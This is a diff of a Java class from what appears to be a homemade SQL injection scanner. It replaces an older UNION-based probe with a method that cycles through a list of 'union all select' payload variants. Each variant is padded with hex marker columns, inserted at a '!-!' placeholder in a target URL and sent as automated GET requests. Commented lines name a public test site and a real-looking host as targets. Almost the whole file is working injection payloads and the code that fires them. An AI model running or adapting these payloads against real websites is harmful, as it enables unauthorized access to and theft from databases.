@@ -5,16 +5,9 @@
  */
 package ControladorMySql;
 
-import java.io.BufferedReader;
-import java.io.FileReader;
-import java.io.InputStreamReader;
-import java.util.regex.Pattern;
-import org.apache.http.HttpEntity;
-import org.apache.http.HttpResponse;
-import org.apache.http.client.HttpClient;
-import org.apache.http.client.methods.HttpGet;
-import org.apache.http.impl.client.DefaultHttpClient;
-import org.apache.http.util.EntityUtils;
+import static ControladorMySql.PrincipalMySql.enviaGet;
+import java.util.logging.Level;
+import java.util.logging.Logger;
 
 /**
  *
@@ -47,97 +40,57 @@ public class UnionBased {
     private Runnable iniciaTeste = new Runnable() {
         @Override
         public void run() {
-            getUnion(getUrl()); // Enviando a url para o metodo get
+            UnionInteger(getUrl());
+            //getUnion(getUrl()); // Enviando a url para o metodo get
         }
     };
 
-    private HttpClient client() {
-        return new DefaultHttpClient();
-    }
-    HttpResponse response;
 
-    public void getUnion(String recebeUrl) {
-        try {
-            boolean encontro = true;
-            int colunas = 30;
-            String payload = "";
-            String url = recebeUrl + "+UNION+SELECT+ALL";
-            //String url = "http://a8lejmad01.com.br/teste/altera.php?id=1+UNION+SELECT+ALL";
+//    public static void main(String[] args) {
+//        teste();
+//    }
 
-            for (int i = 0; i < colunas; i++) {
-                if (i > 0) {
-                    payload = payload + ",CONCAT(0x783031,0x50656e74657374,0x783031)";
-                } else {
-                    payload = payload + "+CONCAT(0x783031,0x50656e74657374,0x783031)";
-                }
-                //System.out.println(url + payload);
+//    public static void teste() {
+//        UnionBased based = new UnionBased();
+//        String url = "http://testphp.vulnweb.com/listproducts.php?cat=9!-!";
+//        based.UnionInteger(url);
+//    }
+    private String UnionStyles[]
+            = {"999999.9+union+all+select+[t]",
+                "999999.9+union+all+select+[t]+and+'0'='0",
+                "999999.9+union+all+select+[t]--",
+                "999999.9+union+all+select+[t]+and+'0'='0--",
+                "999999.9%22+union+all+select+[t]+and+'0'='0",
+                "999999.9)+union+all+select+[t]+and+(0=0",
+                "999999.9+union+all+select+[t]+#",
+                "999999.9'+union+all+select+[t]+and+'0'='0+#",};
+    private int nColunas = 15;
 
-                HttpGet request = new HttpGet(url + payload);
-
-                response = client().execute(request);
-                HttpEntity entity = response.getEntity();
-
-                BufferedReader rd = new BufferedReader(new InputStreamReader(
-                        response.getEntity().getContent()));
-
-                String line = "";
-                while ((line = rd.readLine()) != null && encontro == true) {
-                    //System.out.println(line);                
-                    if (verifica(line)) {
-                        System.err.println("->  " + url + " " + response.getStatusLine() + " Vulneravel - MySqlUnion " + payload);
-                        encontro = false;
+    private void UnionInteger(String url) {
+        String recebeUrl = null;
+        String unionTemporario = null;
+        for (String styles : UnionStyles) {
+            String codHexadecimal = "0x54434350656e74657374";
+            for (int i = 0; i < nColunas; i++) {
+                try {
+                    recebeUrl = url;
+                    if (recebeUrl.contains("!-!")) {
+                        if (i < 1) {
+                            unionTemporario = styles.replace("[t]", codHexadecimal);
+                        } else {
+                            codHexadecimal += "," + "0x54434350656e74657374";
+                            unionTemporario = styles.replace("[t]", codHexadecimal);
+                        }
                     }
-
-                }
-                EntityUtils.consume(entity);
-            }
-
-        } catch (Exception e) {
-        }
-    }
-
-    String payload;
-
-    private boolean verifica(String recebeCodigoFonte) {
-        String content = recebeCodigoFonte;
-        boolean isMatch = false;
-        int qntArquivo = 2;
-        try {
-            BufferedReader a = new BufferedReader(new FileReader("arquivo" + qntArquivo + ".txt"));
-            while (a.ready()) {
-                String pattern = ".*" + a.readLine() + ".*";
-
-                isMatch = Pattern.matches(pattern, content);
-                if (isMatch) {
-                    payload = pattern;
-                    //System.out.println(linha);
-                    return isMatch;
+                    //System.out.println(recebeUrl.replaceAll("!-!", unionTemporario));
+                    enviaGet(recebeUrl.replaceAll("!-!", unionTemporario));
+                } catch (Exception e) {
+                    Logger.getLogger(UnionBased.class.getName()).log(Level.SEVERE, null, e);
                 }
             }
-            a.close();
-        } catch (Exception e) {
-            //System.out.println(e);
         }
-        return isMatch;
+    }        
+    private void UnionKeyword(String url){
+        
     }
-    
-        public static void unionallselect1UnionInteger(String url) {        
-        String formataUrl = url;
-        int colunas = 30;
-        String unionallselect1 = "999999.9+union+all+select+0x393133353134353632312e39";
-        String monta = null;
-        for (int i = 0; i < colunas; i++) {
-            formataUrl = url;
-            if (formataUrl.contains("!-!")) {
-                if (i == 0) {
-                    monta = unionallselect1;
-                } else {
-                    monta = monta + ","+unionallselect1;
-                }
-                formataUrl = formataUrl.replaceAll("!-!", monta);
-                System.out.println(formataUrl);
-            }
-        }
-    }
-
 }
